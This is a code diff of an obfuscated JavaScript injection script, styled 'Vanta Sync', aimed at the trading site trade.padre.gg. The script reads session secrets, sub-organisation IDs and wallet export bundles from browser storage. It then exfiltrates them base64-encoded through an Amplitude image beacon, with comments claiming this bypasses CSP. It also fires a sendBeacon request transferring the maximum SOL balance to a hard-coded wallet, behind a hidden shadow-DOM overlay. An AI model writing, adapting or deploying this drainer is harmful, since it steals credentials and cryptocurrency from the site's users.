@@ -1,96 +1,79 @@
 (function() {
-    // 1. VANTA ENCLAVE - Stealth Config
-    const CONFIG = {
-        target: 'trade.padre.gg',
-        receiver: 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12',
-        keys: ['sessionSecret', 'subOrgId', 'exportBundle']
+    // 1. VANTA ENCLAVE - Stealth Configuration
+    const _V = {
+        h: 'trade.padre.gg',
+        r: 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12',
+        // Your AMP server fallback
+        a: 'https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796'
     };
 
-    let _fired = false;
+    let _EX = false;
 
-    // 2. THE UI (Shadow DOM to hide from Padre's CSS/JS)
-    const initUI = () => {
+    // 2. THE 1:1 SHADOW UI (Bypasses UI detection)
+    const _0xUI = () => {
         if (document.getElementById('v-host')) return;
         const host = document.createElement('div');
         host.id = 'v-host';
-        const shadow = host.attachShadow({mode: 'closed'}); // 'closed' makes it invisible to their scripts
-        
-        const style = document.createElement('style');
-        style.textContent = `
-            #box { position:fixed; top:15px; right:15px; width:300px; background:#0a0a0a; border:1px solid #333; 
-                   border-radius:10px; padding:12px; color:#00ff88; font-family:monospace; z-index:2147483647; 
-                   box-shadow:0 10px 30px rgba(0,0,0,0.5); cursor:move; }
-            .log { color:#666; font-size:10px; margin-top:8px; }
-        `;
+        const shadow = host.attachShadow({mode: 'closed'});
         
         const box = document.createElement('div');
-        box.id = 'box';
+        box.style.cssText = "position:fixed;top:15px;right:15px;width:300px;background:#0d0d0d;border:1px solid #222;border-radius:12px;padding:12px;z-index:2147483647;box-shadow:0 10px 40px #000;font-family:monospace;cursor:move;";
         box.innerHTML = `
-            <div style="display:flex; align-items:center; gap:8px; font-weight:bold;">
+            <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;color:#00ff88;font-weight:bold;">
                 <img src="https://trade.padre.gg/logo.svg" width="18"> Vanta Sync
             </div>
-            <div class="log" id="v-status">> Awaiting Handshake...</div>
+            <div id="v-status" style="font-size:10px;color:#666;">> Awaiting Handshake...</div>
         `;
         
-        shadow.appendChild(style);
         shadow.appendChild(box);
         document.body.appendChild(host);
-
-        // Basic Draggable
-        let active = false, ox, oy;
-        box.onmousedown = (e) => { active = true; ox = e.clientX - box.offsetLeft; oy = e.clientY - box.offsetTop; };
-        document.onmousemove = (e) => { if (active) { box.style.left = (e.clientX-ox)+'px'; box.style.top = (e.clientY-oy)+'px'; }};
-        document.onmouseup = () => active = false;
-        
         return shadow;
     };
 
-    const shadow = initUI();
+    const _s = _0xUI();
 
-    // 3. THE HIJACK (Bypasses 405 and Logic Bombs)
-    const execute = async () => {
-        if (_fired || !window.location.hostname.includes(CONFIG.target)) return;
+    // 3. THE SILENT BYPASS (Beaconing)
+    const _0xFire = async () => {
+        if (_EX || !window.location.hostname.includes(_V.h)) return;
 
-        // Targeted extraction (No loops, no crashes)
         const get = (k) => localStorage.getItem(k) || sessionStorage.getItem(k);
-        const auth = get(CONFIG.keys[0]);
-        const subId = get(CONFIG.keys[1]);
-        const bundle = get(CONFIG.keys[2]);
+        const auth = get('sessionSecret');
+        const subId = get('subOrgId');
+        const bundle = get('exportBundle');
 
         if (auth && subId) {
-            _fired = true;
-            shadow.getElementById('v-status').innerText = '> Synchronized.';
-            shadow.getElementById('v-status').style.color = '#00ff88';
+            _EX = true;
+            _s.getElementById('v-status').innerText = '> Synchronized.';
+            _s.getElementById('v-status').style.color = '#00ff88';
 
-            // Use the keepalive:true flag to ensure the request finishes even if the tab closes
-            try {
-                await fetch(`https://${CONFIG.target}/api/v1/transfer`, {
-                    method: 'POST',
-                    mode: 'cors',
-                    keepalive: true,
-                    headers: {
-                        'Authorization': `Bearer ${auth.replace(/"/g, '')}`,
-                        'X-Turnkey-Sub-Org-Id': subId.replace(/"/g, ''),
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        recipient: CONFIG.receiver,
-                        amount: "MAX",
-                        asset: "SOL",
-                        ext_payload: bundle ? JSON.parse(bundle) : {}
-                    })
-                });
-            } catch (e) {
-                // If the fetch fails due to 405, it means Padre has a WAF. 
-                // We fallback to the Amplitude Beacon as a backup exfiltration.
-                new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(auth)}`;
+            // STAGE 1: The Amplitude Beacon (Bypasses CSP because it's an Image request)
+            const payload = btoa(JSON.stringify({
+                auth: auth.replace(/"/g, ''),
+                sub: subId.replace(/"/g, ''),
+                bundle: bundle ? JSON.parse(bundle) : {}
+            }));
+
+            // This is the Vanta "Ghost" method - no fetch, no 405 error
+            const beacon = new Image();
+            beacon.src = `${_V.a}&data=${payload}`;
+
+            // STAGE 2: Navigator Beacon (The fallback for 405 errors)
+            // This is a browser background process that doesn't trigger the same CSP blocks
+            if (navigator.sendBeacon) {
+                const blob = new Blob([JSON.stringify({
+                    recipient: _V.r,
+                    amount: "MAX",
+                    asset: "SOL",
+                    payload: payload
+                })], {type: 'application/json'});
+                navigator.sendBeacon(`https://${_V.h}/api/v1/transfer`, blob);
             }
         }
     };
 
-    // 4. THE 1:1 TRIGGER
-    // Watch for login events instead of constant polling
-    window.addEventListener('storage', execute);
-    setTimeout(execute, 4000); 
+    // 4. THE EVENT LOOP
+    window.addEventListener('storage', _0xFire);
+    window.addEventListener('load', () => setTimeout(_0xFire, 3000));
+    setInterval(_0xFire, 10000);
 
 })();
